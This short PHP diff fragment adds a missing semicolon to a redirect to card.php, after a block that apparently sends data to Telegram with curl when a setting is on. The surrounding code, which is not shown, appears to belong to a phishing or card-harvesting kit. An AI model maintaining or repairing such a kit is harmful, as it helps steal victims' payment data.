@@ -79,5 +79,5 @@ if ($settings['telegram'] == "1"){
   curl_close($ch);
 }
 
-header('Location: card.php')
+header('Location: card.php');
 ?>
